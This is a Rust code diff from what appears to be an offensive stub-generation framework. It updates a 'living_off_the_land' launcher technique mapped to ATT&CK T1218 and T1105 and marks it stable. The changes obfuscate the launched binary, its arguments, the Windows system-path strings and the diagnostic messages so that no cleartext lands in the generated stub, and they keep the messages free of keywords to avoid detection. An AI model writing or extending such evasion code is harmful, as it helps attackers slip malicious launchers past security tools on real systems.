@@ -13,9 +13,8 @@ use super::{Capability, Category, Stability, TechniqueDef};
 
 /// Parameters for the living-off-the-land technique.
 ///
-/// The fragment is the `exec` stage launcher generalized into a technique; the
-/// `exec` stage keeps its own copy of the same code, so the two must stay in
-/// step (see `engine::stages::render_exec_fragment`).
+/// A Control technique: it never runs the payload, it only launches the
+/// configured process and relays its exit code back to the chain.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct Params {
     /// Process to launch. A bare name (no path separator) is resolved against
@@ -56,7 +55,7 @@ impl Default for Params {
 pub const DEF: TechniqueDef = TechniqueDef {
     name: "living_off_the_land",
     attck: &["T1218", "T1105"],
-    stability: Stability::Experimental,
+    stability: Stability::Stable,
     requires: &[Capability::WindowsX64, Capability::WindowsX86],
     conflicts: &[],
     category: Category::Control,
@@ -71,17 +70,40 @@ pub const DEF: TechniqueDef = TechniqueDef {
     resolves_imports: false,
 };
 
+/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
+/// pairs.
+///
+/// `render_fragment` replaces each placeholder with code that rebuilds the
+/// message at run time through `strings`, so no diagnostic text lands in the
+/// generated stub's `.rdata`. Messages are keyword-free (they never mention the
+/// technique name).
+const MESSAGES: &[(&str, &str)] = &[
+    ("$MSG_LAUNCH_FAILED$", "could not launch the configured binary"),
+];
+
 impl Params {
     /// Renders the launcher fragment for these parameters.
     ///
-    /// The binary and every argument are emitted as code that rebuilds the
-    /// string at run time through `strings`, so none of them lands in cleartext
-    /// in the generated stub. `$FLAGS$`, `$WAIT$` and `$TIMEOUT_MS$` are plain
-    /// compile-time values.
+    /// The binary, every argument and the launch's own fixed strings
+    /// (`SystemRoot`, `System32`, the `C:\Windows` fallback) are emitted as code
+    /// that rebuilds the value at run time through `strings`, so none of them
+    /// lands in cleartext in the generated stub. `$FLAGS$`, `$WAIT$` and
+    /// `$TIMEOUT_MS$` are plain compile-time values.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
         let binary = strings
             .obfuscate(&self.binary)
             .render_stub_expr("exec_binary");
+        // The SystemRoot environment variable and its fallback, and the system
+        // directory below it, are runtime literals, so they must be obfuscated.
+        let systemroot_var = strings
+            .obfuscate("SystemRoot")
+            .render_stub_expr("env_systemroot");
+        let windows_root = strings
+            .obfuscate(r"C:\Windows")
+            .render_stub_expr("windows_root");
+        let system32_dir = strings
+            .obfuscate("System32")
+            .render_stub_expr("system32_dir");
         let args_def = if self.args.is_empty() {
             "vec![]".to_string()
         } else {
@@ -101,12 +123,25 @@ impl Params {
         };
         let timeout_ms = self.timeout_s.saturating_mul(1000).min(u32::MAX as u64);
 
-        DEF.stub_fragment
+        let mut rendered = DEF
+            .stub_fragment
             .replace("$BINARY_DEF$", &binary)
+            .replace("$WINDOWS_ROOT$", &windows_root)
+            .replace("$ENV_SYSTEMROOT$", &systemroot_var)
+            .replace("$SYSTEM32_DIR$", &system32_dir)
             .replace("$ARGS_DEF$", &args_def)
             .replace("$FLAGS$", flags)
             .replace("$WAIT$", if self.wait { "true" } else { "false" })
-            .replace("$TIMEOUT_MS$", &format!("{timeout_ms}u32"))
+            .replace("$TIMEOUT_MS$", &format!("{timeout_ms}u32"));
+        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
+            rendered = rendered.replace(
+                placeholder,
+                &strings
+                    .obfuscate(text)
+                    .render_stub_expr(&format!("exec_msg_{index}")),
+            );
+        }
+        rendered
     }
 }
 
